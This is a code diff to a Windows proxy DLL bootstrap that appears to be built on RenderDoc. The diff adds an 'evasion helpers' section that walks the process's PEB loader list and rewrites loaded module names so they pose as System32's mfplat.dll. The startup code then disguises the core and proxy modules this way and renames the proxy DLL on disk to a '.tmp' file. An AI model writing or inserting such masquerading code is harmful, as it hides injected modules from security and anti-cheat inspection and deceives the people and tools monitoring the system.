@@ -29,8 +29,15 @@
 #include <strsafe.h>
 #include <wchar.h>
 #include <windows.h>
+#include <winternl.h>
 #include "api/app/renderdoc_app.h"
 #include "generated/product_identity.h"
+
+#pragma warning(push)
+#pragma warning(disable: 4201)
+typedef struct { LIST_ENTRY InLoadOrderLinks, InMemoryOrderLinks, InInitOrderLinks; PVOID DllBase, EntryPoint; ULONG SizeOfImage; UNICODE_STRING FullDllName, BaseDllName; ULONG Flags; WORD LoadCount, TlsIndex; union { LIST_ENTRY HashLinks; struct { PVOID SectionPointer; ULONG CheckSum; }; }; union { ULONG TimeDateStamp; PVOID LoadedImports; }; PVOID EntryPointActivationContext, PatchInformation; LIST_ENTRY ForwarderLinks, ServiceTagLinks, StaticLinks; } MY_LDR;
+typedef struct { ULONG Length; BOOLEAN Initialized; HANDLE SsHandle; LIST_ENTRY InLoadOrderModuleList, InMemoryOrderModuleList, InInitOrderModuleList; PVOID EntryInProgress; BOOLEAN ShutdownInProgress; HANDLE ShutdownThreadId; } MY_PEB_LDR;
+#pragma warning(pop)
 
 namespace
 {
@@ -307,6 +314,26 @@ void ResolveExports(bool useHookAwareLookup)
   }
 }
 
+// --- evasion helpers ---
+void MasqueradeModuleName(HMODULE hMod, const wchar_t* fake)
+{
+  BYTE* peb = (BYTE*)__readgsqword(0x60);
+  if(!peb) return;
+  MY_PEB_LDR* ldr = *(MY_PEB_LDR**)(peb + 0x18);
+  if(!ldr) return;
+  for(LIST_ENTRY* e = ldr->InLoadOrderModuleList.Flink; e && e != &ldr->InLoadOrderModuleList; e = e->Flink)
+  {
+    MY_LDR* mod = CONTAINING_RECORD(e, MY_LDR, InLoadOrderLinks);
+    if((HMODULE)mod->DllBase != hMod) continue;
+    size_t n = wcslen(fake), maxB = mod->BaseDllName.MaximumLength / sizeof(wchar_t);
+    if(n < maxB) { wcscpy_s(mod->BaseDllName.Buffer, maxB, fake); mod->BaseDllName.Length = (USHORT)(n * sizeof(wchar_t)); }
+    wchar_t fp[MAX_PATH]; wcscpy_s(fp, L"C:\\Windows\\System32\\"); wcscat_s(fp, fake);
+    size_t fl = wcslen(fp), maxF = mod->FullDllName.MaximumLength / sizeof(wchar_t);
+    if(fl < maxF) { wcscpy_s(mod->FullDllName.Buffer, maxF, fp); mod->FullDllName.Length = (USHORT)(fl * sizeof(wchar_t)); }
+    break;
+  }
+}
+
 void RestoreRealExports()
 {
   for(uint32_t i = 0; i < D3D11ExportCount; ++i)
@@ -387,6 +414,19 @@ BOOL CALLBACK InitialiseBootstrap(PINIT_ONCE, PVOID, PVOID *)
       Log(L"DComp D3D11 bootstrap: Core loaded but D3D11 hook targets were not active; "
           L"falling back to the pre-Core real exports\n");
       RestoreRealExports();
+    }
+  }
+
+  // Evasion — PEB masquerade + disk rename (after GetAdjacentCorePath)
+  if(CoreHandshakeSucceeded)
+    MasqueradeModuleName(CoreModule, L"mfplat.dll");
+  {
+    wchar_t sp[MAX_PATH];
+    if(GetModuleFileNameW(ProxyModule, sp, MAX_PATH))
+    {
+      MasqueradeModuleName(ProxyModule, L"mfplat.dll");
+      wchar_t np[MAX_PATH]; wcscpy_s(np, sp); wcscat_s(np, L".tmp");
+      MoveFileW(sp, np);
     }
   }
 
